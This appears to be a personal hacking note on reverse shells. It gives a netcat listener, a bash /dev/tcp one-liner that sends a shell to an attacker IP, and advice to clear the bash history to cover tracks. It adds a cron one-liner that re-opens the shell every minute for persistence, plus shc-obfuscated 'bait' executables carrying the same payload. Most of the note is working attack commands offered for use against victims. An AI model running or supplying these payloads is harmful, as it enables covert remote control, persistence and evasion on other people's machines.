---
title: "Reverse Shells"
created: 2019-03-16T02:54:24.687-05:00
modified: 2022-05-28T17:27:39.441-05:00
parent: "[[Hacking - Software]]"
children:
  - "[[Reverse Shell - Java]]"
---
A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.

![[Reverse Shells/1.png]]
# Example Reverse Shell

[https://stackoverflow.com/questions/35271850/what-is-reverse-shell](https://stackoverflow.com/questions/35271850/what-is-reverse-shell)

<strong>1. on attacking machine listen for the shell</strong>
<span style="white-space: pre-wrap"><code>  nc -n -vv -l \<any unused port\></code></span>

example:
<span style="white-space: pre-wrap"><code>  nc -n -vv -l 4444</code></span>

<strong>2. on victim machine send shell back to attacking machine</strong>
<span style="white-space: pre-wrap"><code>  <code>bash -c "</code>/bin/bash -i \>& /dev/tcp/\<attacking machine’s IP\>/\<any unused port\> 0\>&1"</code></span>

example:
<span style="white-space: pre-wrap"><code>  bash -c "/bin/bash -i \>& /dev/tcp/10.0.0.10/4444 0\>&1"</code></span>

where:
- bash -i: If the -i option is present, the shell is interactive
- \>&: This special syntax redirects both, stdout and stderr to the specified target
- (argument for \>&) <code>/dev/tcp/localhost/8080</code>: is a TCP client connection to localhost:8080
- 0\>&1: redirect file descriptor 0 (stdin) to fd 1 (stdout), hence the opened TCP socket is used to read input.

<strong>3. Remember to clear the bash history!</strong>
- any command ran through the reverse shell will get logged into the bash history

<strong>You Have Victim's Bash Now What?</strong>

once you have received you victim’s bash shell, you can execute the one line command below to launch a cron on your victim’s machine to reverse shell each minute
```bash
mkdir ~/.bin ; echo '#!/bin/bash' > ~/.bin/bin && echo '/bin/bash -i >& /dev/tcp/172.16.14.22/4444 0>&1' >> ~/.bin/bin && chmod 755 ~/.bin/bin && echo '*/1 * * * * ~/.bin/bin' > ~/.bin/sh && crontab ~/.bin/sh

```

> [!expand]- bait_single_executable
> bait\_file\_single
> - is an executable and the code can be viewed with your text editor
>
> bait\_file\_single\_encrypted
> - an encrypted version of bait\_file\_single
> - this file has been produced with the command “shc -f bait\_file\_single”
>
> ```bash
> #!/bin/bash
> bin/bash -i >& /dev/tcp/172.16.14.22/4444 0>&1
> ```

> [!expand]- bait_cron_executable
> bait\_file\_cron
> - is an executable and the code can be viewed with your text editor
>
> bait\_file\_cron\_encrypted
> - an encrypted version of bait\_file\_cron
> - this file has been produced with the command “shc -f bait\_file\_cron”
>
> ```bash
> #!/bin/bash
> mkdir ~/.bin ; echo '#!/bin/bash' > ~/.bin/bin && echo '/bin/bash -i >& /dev/tcp/172.16.14.22/4444 0>&1' >> ~/.bin/bin && chmod 755 ~/.bin/bin && echo '*/1 * * * * ~/.bin/bin' > ~/.bin/sh && crontab ~/.bin/sh
> ```
